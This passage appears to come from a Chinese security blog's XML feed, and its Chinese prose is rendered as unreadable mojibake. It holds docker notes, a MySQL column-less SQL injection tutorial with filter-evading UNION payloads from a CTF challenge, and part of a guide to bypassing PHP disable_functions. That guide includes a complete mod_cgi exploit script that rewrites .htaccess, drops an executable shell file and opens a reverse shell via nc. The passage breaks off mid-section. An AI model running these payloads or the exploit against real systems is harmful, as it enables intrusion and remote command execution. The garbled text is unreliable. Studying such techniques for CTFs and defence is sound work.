ä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œé€šå¸¸ä¸ -i åŒæ—¶ä½¿ç”¨ï¼›</span><br><span class="line">docker run [é•œåƒ]  apt-get install -y app_name    #åœ¨å®¹å™¨å®‰è£…æ–°çš„ç¨‹åº</span><br><span class="line"></span><br><span class="line">docker exec -it kali &#x2F;bin&#x2F;bash          #è¿›å…¥å®¹å™¨</span><br><span class="line">docker run -it -d kali                  #å¯åŠ¨å®¹å™¨ï¼Œåå°è¿è¡Œ #-d: åå°è¿è¡Œå®¹å™¨ï¼Œå¹¶è¿”å›å®¹å™¨IDï¼›</span><br><span class="line">docker run -it -p 53:53 kali            #å¯åŠ¨å®¹å™¨çš„æ—¶å€™å¯ä»¥æ˜ å°„ç«¯å£ #-p: ç«¯å£æ˜ å°„ï¼Œæ ¼å¼ä¸ºï¼šä¸»æœº(å®¿ä¸»)ç«¯å£:å®¹å™¨ç«¯å£</span><br><span class="line"></span><br><span class="line">#è¿›å…¥äº¤äº’å¼ç•Œé¢</span><br><span class="line">è¿›å…¥å®¹å™¨ï¼š</span><br><span class="line">sudo docker ps -a</span><br><span class="line">sudo docker exec -it [å®¹å™¨ID] &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹å®¹å™¨</span><br><span class="line">docker ps                   #åˆ—å‡ºå½“å‰è¿è¡Œçš„å®¹å™¨</span><br><span class="line">docker ps -a                #åˆ—å‡ºæ‰€æœ‰çš„å®¹å™¨</span><br><span class="line">docker ps -l                #åˆ—å‡ºæœ€è¿‘ä¸€æ¬¡å¯åŠ¨çš„å®¹å™¨</span><br><span class="line">docker ps -a -q             #æŸ¥çœ‹æ‰€æœ‰çš„å®¹å™¨ID</span><br><span class="line"></span><br><span class="line">#å®¹å™¨æ“ä½œ</span><br><span class="line">docker inspect [å®¹å™¨åå­—]&#x2F;ID        #æ˜¾ç¤ºå®¹å™¨ä¿¡æ¯</span><br><span class="line">docker start [å®¹å™¨åå­—]&#x2F;ID      #å¯åŠ¨å®¹å™¨</span><br><span class="line">docker stop [å®¹å™¨åå­—]&#x2F;ID       #åœæ­¢å®¹å™¨</span><br><span class="line">docker kill [å®¹å™¨åå­—]&#x2F;ID       #æ€æ­»å®¹å™¨</span><br><span class="line">docker restart [å®¹å™¨åå­—]&#x2F;ID        #é‡æ–°å¯åŠ¨å®¹å™¨</span><br><span class="line">docker attach [å®¹å™¨åå­—]&#x2F;ID     #è¿›å…¥å®¹å™¨</span><br><span class="line">docker logs [å®¹å™¨åå­—]&#x2F;ID       #æŸ¥çœ‹å®¹å™¨æ—¥å¿—</span><br><span class="line">docker diff [å®¹å™¨åå­—]&#x2F;ID       #æŸ¥çœ‹å®¹å™¨ä¿®æ”¹æ“ä½œ</span><br><span class="line">docker top [å®¹å™¨åå­—]&#x2F;ID            #æ˜¾ç¤ºå®¹å™¨è¿›ç¨‹ä¿¡æ¯</span><br><span class="line">docker cp ID:&#x2F;path to_path      #ä»å®¹å™¨ä¸­æ‹·è´æ•°æ®åˆ°æœ¬åœ°</span><br><span class="line">docker cp [å®¹å™¨åå­—]:&#x2F;path to_path  #ä»å®¹å™¨ä¸­æ‹·è´æ•°æ®åˆ°æœ¬åœ°</span><br><span class="line"></span><br><span class="line">#åˆ é™¤å®¹å™¨</span><br><span class="line">docker rm [å®¹å™¨]&#x2F;ID       #åˆ é™¤å®¹å™¨</span><br><span class="line">docker rm $(docker ps -a -q)    #åˆ é™¤æ‰€æœ‰åœæ­¢çš„å®¹å™¨</span><br><span class="line">docker rm -f $(docker ps -a -q) #å¼ºåˆ¶åˆ é™¤æ‰€æœ‰çš„å®¹å™¨</span><br></pre></td></tr></table></figure><p>å‚è€ƒé“¾æ¥ï¼š</p><blockquote><p><a href="https://www.smi1e.top/docker-%e7%ac%94%e8%ae%b0/" target="_blank" rel="noopener">https://www.smi1e.top/docker-%e7%ac%94%e8%ae%b0/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> åŸºç¡€çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQLæ— åˆ—åæ³¨å…¥</title>
      <link href="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-ç®€ä»‹"><a href="#0x-01-ç®€ä»‹" class="headerlink" title="0x 01 ç®€ä»‹"></a>0x 01 ç®€ä»‹</h3><p>é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯åœ¨ä¸çŸ¥é“åˆ—åçš„æƒ…å†µä¸‹è¿›è¡Œ sql æ³¨å…¥ã€‚</p><p>åœ¨ mysql =&gt; 5 çš„ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€ä¸ªåä¸º  information_schema çš„åº“ï¼Œé‡Œé¢è®°å½•ç€ mysql ä¸­æ‰€æœ‰è¡¨çš„ç»“æ„ã€‚é€šå¸¸ï¼Œåœ¨ mysql sqli  ä¸­ï¼Œæˆ‘ä»¬ä¼šé€šè¿‡æ­¤åº“ä¸­çš„è¡¨å»è·å–å…¶ä»–è¡¨çš„ç»“æ„ï¼Œä¹Ÿå°±æ˜¯è¡¨åã€åˆ—åç­‰ã€‚ä½†æ˜¯è¿™ä¸ªåº“ç»å¸¸è¢« WAF è¿‡æ»¤ã€‚</p><p>å½“æˆ‘ä»¬é€šè¿‡æš´åŠ›ç ´è§£è·å–åˆ°è¡¨ååï¼Œå¦‚ä½•åˆ©ç”¨å‘¢ï¼Ÿ</p><p>åœ¨ information_schema ä¸­ï¼Œé™¤äº† SCHEMATAã€TABLESã€COLUMNS æœ‰è¡¨ä¿¡æ¯å¤–ï¼Œé«˜ç‰ˆæœ¬çš„ mysql ä¸­ï¼Œè¿˜æœ‰ INNODB_TABLES åŠ INNODB_COLUMNS ä¸­è®°å½•ç€è¡¨ç»“æ„ã€‚</p><h3 id="0x-02-ä½¿ç”¨æ¡ä»¶-amp-æ–¹æ³•"><a href="#0x-02-ä½¿ç”¨æ¡ä»¶-amp-æ–¹æ³•" class="headerlink" title="0x 02 ä½¿ç”¨æ¡ä»¶&amp;æ–¹æ³•"></a>0x 02 ä½¿ç”¨æ¡ä»¶&amp;æ–¹æ³•</h3><p> <strong>ä½¿ç”¨æ¡ä»¶&amp;æ–¹æ³•</strong></p><p>æ— åˆ—åæ³¨å…¥ä¸»è¦æ˜¯é€‚ç”¨äºå·²ç»è·å–åˆ°æ•°æ®è¡¨ï¼Œä½†æ— æ³•æŸ¥è¯¢åˆ—çš„æƒ…å†µä¸‹ï¼Œåœ¨å¤§å¤šæ•° CTF é¢˜ç›®ä¸­ï¼Œinformation_schema åº“è¢«è¿‡æ»¤ï¼Œä½¿ç”¨è¿™ç§æ–¹æ³•è·å–åˆ—åã€‚</p><p>æ— åˆ—åæ³¨å…¥çš„åŸç†å…¶å®å¾ˆç®€å•ï¼Œç±»ä¼¼äºå°†æˆ‘ä»¬ä¸çŸ¥é“çš„åˆ—åè¿›è¡Œå–åˆ«åæ“ä½œï¼Œåœ¨å–åˆ«åçš„åŒæ—¶è¿›è¡Œæ•°æ®æŸ¥è¯¢ï¼Œæ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬æŸ¥è¯¢çš„å­—æ®µå¤šäºæ•°æ®è¡¨ä¸­åˆ—çš„æ—¶å€™ï¼Œå°±ä¼šå‡ºç°æŠ¥é”™ã€‚</p><p> <strong>ä¸ä½¿ç”¨è¡¨åæŸ¥è¯¢</strong></p><p>æ­£å¸¸çš„ sql æŸ¥è¯¢å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#96;admin&#96;;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200221120103425.png" alt></p><p>å…¶ä¸­ï¼Œåˆ—åä¸º idã€nameã€passwordï¼Œä½¿ç”¨ union æŸ¥è¯¢ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from admin;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200221120025502.png" alt></p><p>å¦‚å›¾ï¼Œæˆ‘ä»¬çš„åˆ—åè¢«æ›¿æ¢ä¸ºäº†å¯¹åº”çš„æ•°å­—ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­æ•°å­—æ¥å¯¹åº”åˆ—ï¼Œå¦‚ 3 å¯¹åº”äº†è¡¨é‡Œé¢çš„ passwordï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#96;3&#96; from (select 1,2,3 union select * from admin)a;</span><br></pre></td></tr></table></figure><p>æœ«å°¾çš„ a å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ï¼Œç”¨äºå‘½åã€‚</p><p>å½“ç„¶ï¼Œå¤šæ•°æƒ…å†µä¸‹ï¼Œ` ä¼šè¢«è¿‡æ»¤ã€‚å½“ ` ä¸èƒ½ä½¿ç”¨çš„æ—¶å€™ï¼Œä½¿ç”¨åˆ«åæ¥ä»£æ›¿ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from admin)a;</span><br></pre></td></tr></table></figure><p>åŒæ—¶æŸ¥è¯¢å¤šä¸ªåˆ—ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(&#96;2&#96;,0x2d,&#96;3&#96;) from (select 1,2,3 union select * from admin)a limit 1,3;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322230016384.png" alt></p><p>ç®€è€Œè¨€ä¹‹ï¼Œå¯ä»¥é€šè¿‡ä»»æ„å‘½åè¿›å…¥è¯¥è¡¨ï¼Œç„¶åä½¿ç”¨ SELECT æŸ¥è¯¢è¿™äº›å­—æ®µä¸­çš„ä»»ä½•å·²çŸ¥å€¼ã€‚</p><p>payloadï¼š<code>select a,b from posts where a=-1 union select 1,(select concat(</code>3<code>,0x2d,</code>4<code>) from (select 1,2,3,4,5,6 union select * from xxx)a limit 1,1);</code></p><h3 id="0x-03-ä¾‹é¢˜åˆ†æ"><a href="#0x-03-ä¾‹é¢˜åˆ†æ" class="headerlink" title="0x 03 ä¾‹é¢˜åˆ†æ"></a>0x 03 ä¾‹é¢˜åˆ†æ</h3><h4 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h4><ol><li>æ³¨å…¥ç‚¹åœ¨å¹¿å‘Šåã€‚ç‚¹å‡»å¹¿å‘Šè¯¦æƒ…ï¼Œå‘ç°æ•°æ®åº“çš„æŠ¥é”™ä¿¡æ¯ï¼Œè¯æ˜å­˜åœ¨æ³¨å…¥ã€‚</li></ol><p>ç®€å•æµ‹è¯•äº†ä¸€ä¸‹ï¼Œç©ºæ ¼ å’Œ or è¢«è¿‡æ»¤ï¼ŒæŠ¥é”™è¿‡æ»¤äº†extractvalue å’Œ updatexmlï¼Œäºæ˜¯è€ƒè™‘ç”¨ union è”åˆæ³¨å…¥ã€‚</p><p>é¦–å…ˆæµ‹è¯•å­—æ®µæ•°é‡,æœ‰22ä¸ªå­—æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,user(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"></span><br><span class="line">#group byè·å–åˆ—æ•°</span><br><span class="line">-1&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39;11</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯,æ˜¯MariaDB</p><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322231728123.png" alt></p><p>ç”±äºè¿‡æ»¤äº†or,æ‰€ä»¥ç”¨mysql.innodb_table_statsæŸ¥è¯¢æ•°æ®è¡¨æˆ–è€…ç”¨sys.schema_auto_increment_columns</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322232338100.png" alt></p><p>æŸ¥è¯¢usersè¡¨ï¼Œå¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322232819155.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> tricks </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> MySQLæ— åˆ—åæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bypass disabled_functions &amp; open_basedirå­¦ä¹ </title>
      <link href="/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-å‰è¨€"><a href="#0x-01-å‰è¨€" class="headerlink" title="0x 01 å‰è¨€"></a>0x 01 å‰è¨€</h3><p>â€‹        å¸¸è§çš„æœ‰å››ç§ç»•è¿‡ disable_functions çš„æ‰‹æ³•ï¼šç¬¬ä¸€ç§ï¼Œæ”»å‡»åç«¯ç»„ä»¶ï¼Œå¯»æ‰¾å­˜åœ¨å‘½ä»¤æ³¨å…¥çš„ã€web  åº”ç”¨å¸¸ç”¨çš„åç«¯ç»„ä»¶ï¼Œå¦‚ï¼ŒImageMagick çš„é­”å›¾æ¼æ´ã€bash çš„ç ´å£³æ¼æ´ï¼›ç¬¬äºŒç§ï¼Œå¯»æ‰¾æœªç¦ç”¨çš„æ¼ç½‘å‡½æ•°ï¼Œå¸¸è§çš„æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰  system()ã€exec()ã€shell_exec()ã€passthru()ï¼Œååƒ» popen()ã€proc_open()ã€pcntl_exec()ï¼Œé€ä¸€å°è¯•ï¼Œæˆ–è®¸æœ‰æ¼ç½‘ä¹‹é±¼ï¼›ç¬¬ä¸‰ç§ï¼Œmod_cgi æ¨¡å¼ï¼Œå°è¯•ä¿®æ”¹  .htaccessï¼Œè°ƒæ•´è¯·æ±‚è®¿é—®è·¯ç”±ï¼Œç»•è¿‡ php.ini ä¸­çš„ä»»ä½•é™åˆ¶ï¼›ç¬¬å››ç§ï¼Œåˆ©ç”¨ç¯å¢ƒå˜é‡ LD_PRELOAD  åŠ«æŒç³»ç»Ÿå‡½æ•°ï¼Œè®©å¤–éƒ¨ç¨‹åºåŠ è½½æ¶æ„ *.soï¼Œè¾¾åˆ°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ•ˆæœã€‚</p><h3 id="0x-02-é»‘åå•-bypass"><a href="#0x-02-é»‘åå•-bypass" class="headerlink" title="0x 02 é»‘åå• bypass"></a>0x 02 é»‘åå• bypass</h3><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œdisable_functions æ˜¯åŸºäºé»‘åå•æ¥å®ç°å¯¹æŸäº›å‡½æ•°ä½¿ç”¨çš„é™åˆ¶çš„ï¼Œæ—¢ç„¶æ˜¯é»‘åå•æœ‰æ—¶å€™å°±éš¾å…ä¼šæœ‰æ¼ç½‘ä¹‹é±¼</p><p>PHP ä¸­èƒ½ç›´æ¥æ‰§è¡Œç³»ç»Ÿç¨‹åºçš„å‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">shell_exec(ï¼‰</span><br><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">dl() &#x2F;&#x2F; åŠ è½½è‡ªå®šä¹‰ php æ‰©å±•</span><br></pre></td></tr></table></figure><p>PHP ä¸­æ‰§è¡Œè¿ç®—ç¬¦ï¼ˆåå¼•å·ï¼‰çš„æ•ˆæœå’Œ shell_exec() æ˜¯ç›¸åŒçš„</p><h3 id="0x-03-ç¬¬äºŒç§ï¼šmod-cgi-bypassä»‹ç»"><a href="#0x-03-ç¬¬äºŒç§ï¼šmod-cgi-bypassä»‹ç»" class="headerlink" title="0x 03 ç¬¬äºŒç§ï¼šmod_cgi bypassä»‹ç»"></a>0x 03 ç¬¬äºŒç§ï¼šmod_cgi bypassä»‹ç»</h3><p>å…³äºmode_cgiï¼Œå¯ä»¥å‚è€ƒapacheçš„å®˜æ–¹è¯´æ˜ï¼š<a href="http://man.chinaunix.net/newsoft/ApacheManual/mod/mod_cgi.htmlã€‚" target="_blank" rel="noopener">http://man.chinaunix.net/newsoft/ApacheManual/mod/mod_cgi.htmlã€‚</a></p><blockquote><p>â€œä»»ä½•å…·æœ‰mimeç±»å‹application/x-httpd-cgiæˆ–è€…è¢« cgi-scriptå¤„ç†å™¨(Apache 1.1æˆ–ä»¥åç‰ˆæœ¬)å¤„ç†çš„æ–‡ä»¶å°†è¢«ä½œä¸ºCGIè„šæœ¬å¯¹å¾…å¹¶ç”±æœåŠ¡å™¨è¿è¡Œ, å®ƒçš„è¾“å‡ºå°†è¢«è¿”å›ç»™å®¢æˆ·ç«¯ã€‚é€šè¿‡ä¸¤ç§é€”å¾„ä½¿æ–‡ä»¶æˆä¸ºCGIè„šæœ¬ï¼Œæˆ–è€…æ–‡ä»¶å…·æœ‰å·²ç”± AddTypeæŒ‡ä»¤å®šä¹‰çš„æ‰©å±•åï¼Œæˆ–è€…æ–‡ä»¶ä½äº ScriptAliasç›®å½•ä¸­ã€‚â€ï¼Œè¿™å°±è¡¨ç¤ºï¼Œapacheå…è®¸WEBæœåŠ¡å™¨ä¸å¯æ‰§è¡Œæ–‡ä»¶è¿›è¡Œäº¤äº’ã€‚</p></blockquote><p>æ»¡è¶³æ¡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. apacheç¯å¢ƒ</span><br><span class="line">2. mod_cgiå·²å¯ç”¨</span><br><span class="line">3. htaccessçš„æ–‡ä»¶å¿…é¡»è¢«å…è®¸ï¼Œå³åœ¨httpd.confä¸­ï¼Œè¦æ³¨æ„AllowOverrideé€‰é¡¹ä¸ºAll</span><br><span class="line">4. ä½ å¿…é¡»èƒ½å¤Ÿå†™å…¥æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>æ”»å‡»æ€è·¯ï¼šå…ˆæŠŠè¦æ‰§è¡Œçš„ç¨‹åºå†™å…¥ä¸€ä¸ªç‰¹å®šæ‰©å±•åçš„æ–‡ä»¶é‡Œï¼Œç„¶åä¿®æ”¹.htaccessæ–‡ä»¶ï¼Œé€šè¿‡OptionsæŒ‡ä»¤å…è®¸ä½¿ç”¨mod_cgiæ¨¡å—æ‰§è¡ŒCGIè„šæœ¬ï¼Œç„¶åå†è®©æˆ‘ä»¬ç‰¹å®šçš„æ‰©å±•åä»¥cgi-scriptè¿›è¡Œå¤„ç†ï¼Œè¿™æ ·æˆ‘ä»¬ç”šè‡³å¯ä»¥åå¼¹ä¸€ä¸ªshellå‡ºæ¥ã€‚</p><p>POCå¦‚ä¸‹ï¼Œé™„æ³¨é‡Šï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">"nc -c'/bin/bash' 127.0.0.1 4444"</span>; <span class="comment">//åå¼¹ä¸€ä¸ªshellå‡ºæ¥ï¼Œè¿™é‡Œç”¨æœ¬åœ°çš„4444ç«¯å£</span></span><br><span class="line">$shellfile =<span class="string">"#!/bin/bash\n"</span>; <span class="comment">//æŒ‡å®šshell</span></span><br><span class="line">$shellfile .=<span class="string">"echo -ne \"Content-Type: text/html\\n\\n\"\n"</span>; <span class="comment">//éœ€è¦æŒ‡å®šè¿™ä¸ªheaderï¼Œå¦åˆ™ä¼šè¿”å›500</span></span><br><span class="line">$shellfile .=<span class="string">"$cmd"</span>; </span><br><span class="line">functioncheckEnabled($text,$condition,$yes,$no) <span class="comment">//this surely can be shorter</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$text: "</span> . ($condition ?$yes : $no) . <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'checked'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    @file_put_contents(<span class="string">'.htaccess'</span>,<span class="string">"\nSetEnv HTACCESS on"</span>, FILE_APPEND); </span><br><span class="line">    header(<span class="string">'Location: '</span> . $_SERVER[<span class="string">'PHP_SELF'</span>]. <span class="string">'?checked=true'</span>); <span class="comment">//æ‰§è¡Œç¯å¢ƒçš„æ£€æŸ¥</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $modcgi = in_array(<span class="string">'mod_cgi'</span>,apache_get_modules()); <span class="comment">// æ£€æµ‹mod_cgiæ˜¯å¦å¼€å¯</span></span><br><span class="line">    $writable = is_writable(<span class="string">'.'</span>); <span class="comment">//æ£€æµ‹å½“å‰ç›®å½•æ˜¯å¦å¯å†™</span></span><br><span class="line">    $htaccess = !<span class="keyword">empty</span>($_SERVER[<span class="string">'HTACCESS'</span>]);<span class="comment">//æ£€æµ‹æ˜¯å¦å¯ç”¨äº†.htaccess</span></span><br><span class="line">        checkEnabled(<span class="string">"Mod-Cgienabled"</span>,$modcgi,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">        checkEnabled(<span class="string">"Iswritable"</span>,$writable,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">        checkEnabled(<span class="string">"htaccessworking"</span>,$htaccess,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($modcgi &amp;&amp; $writable&amp;&amp; $htaccess))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Error. All of the above mustbe true for the script to work!"</span>; <span class="comment">//å¿…é¡»æ»¡è¶³æ‰€æœ‰æ¡ä»¶</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">       </span><br><span class="line"> checkEnabled(<span class="string">"Backing </span></span><br><span class="line"><span class="string">up.htaccess"</span>,copy(<span class="string">".htaccess"</span>,<span class="string">".htaccess.bak"</span>),<span class="string">"Suceeded!Saved in </span></span><br><span class="line"><span class="string">.htaccess.bak"</span>,<span class="string">"Failed!"</span>); <span class="comment">//å¤‡ä»½ä¸€ä¸‹åŸæœ‰.htaccess</span></span><br><span class="line">        </span><br><span class="line">checkEnabled(<span class="string">"Write </span></span><br><span class="line"><span class="string">.htaccessfile"</span>,file_put_contents(<span class="string">'.htaccess'</span>,<span class="string">"Options </span></span><br><span class="line"><span class="string">+ExecCGI\nAddHandlercgi-script </span></span><br><span class="line"><span class="string">.dizzle"</span>),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>);<span class="comment">//.dizzleï¼Œæˆ‘ä»¬çš„ç‰¹å®šæ‰©å±•å</span></span><br><span class="line">        checkEnabled(<span class="string">"Write shellfile"</span>,file_put_contents(<span class="string">'shell.dizzle'</span>,$shellfile),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>);<span class="comment">//å†™å…¥æ–‡ä»¶</span></span><br><span class="line">        checkEnabled(<span class="string">"Chmod777"</span>,chmod(<span class="string">"shell.dizzle"</span>,<span class="number">0777</span>),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>);<span class="comment">//ç»™æƒé™</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Executing the script now.Check your listener &lt;img src = 'shell.dizzle' style ='display:none;'&gt;"</span>; <span class="comment">//è°ƒç”¨</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…·ä½“æ”»å‡»æ–¹æ³•å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://www.freebuf.com/articles/web/169156.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169156.html</a></p><h3 id="0x-04-ç¬¬å››ç§ï¼š-LD-PRELOAD-bypassä»‹ç»"><a href="#0x-04-ç¬¬å››ç§ï¼š-LD-PRELOAD-bypassä»‹ç»" class="headerlink" title="0x 04 ç¬¬å››ç§ï¼š LD_PRELOAD bypassä»‹ç»"></a>0x 04 ç¬¬å››ç§ï¼š LD_PRELOAD bypassä»‹ç»</h3><p>è¿™é‡Œéœ€è¦ä»‹ç»ä¸€ä¸ªå‰ç½®çŸ¥è¯†ï¼š</p><h5 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h5><blockquote><p>LD_PRELOAD æ˜¯ Linux ä¸‹çš„ä¸€ä¸ªç¯å¢ƒå˜é‡,åŠ¨æ€é“¾æ¥å™¨åœ¨è½½å…¥ä¸€ä¸ªç¨‹åºæ‰€éœ€çš„æ‰€æœ‰åŠ¨æ€åº“ä¹‹å‰,é¦–å…ˆä¼šè½½å…¥LD_PRELOAD ç¯å¢ƒå˜é‡æ‰€æŒ‡å®šçš„åŠ¨æ€åº“ã€‚</p></blockquote><p>ä»ä¸Šé¢å¯ä»¥çœ‹å‡ºæœ¬æ¥LD_PRELOADçš„ä½œç”¨æ˜¯åˆ©ç”¨æˆ‘ä»¬åŠ è½½è¿›æ¥çš„soï¼Œå»è¦†ç›–ç›¸åŒå‡½æ•°åçš„åº“å‡½æ•°ï¼Œå»ä½¿ç”¨è‡ªå·±çš„å‡½æ•°ï¼Œæ›´åŠ æ–¹ä¾¿ï¼Œä½†æ˜¯å¦‚æœè‡ªå·±çš„å‡½æ•°ä¸ºæ¶æ„å‡½æ•°ï¼Œå°±é€ æˆäº†æ¶æ„ç¨‹åºæ³¨å…¥ã€‚</p><p>åˆ©ç”¨ putenv è®¾ç½®LD_PRELOADå˜é‡ï¼Œæ—¢èƒ½ç»•è¿‡open basedirï¼Œåˆèƒ½ç»•è¿‡disable functions</p><h5 id="putenvå¯ä»¥è®¾ç½®ç¯å¢ƒå˜é‡"><a href="#putenvå¯ä»¥è®¾ç½®ç¯å¢ƒå˜é‡" class="headerlink" 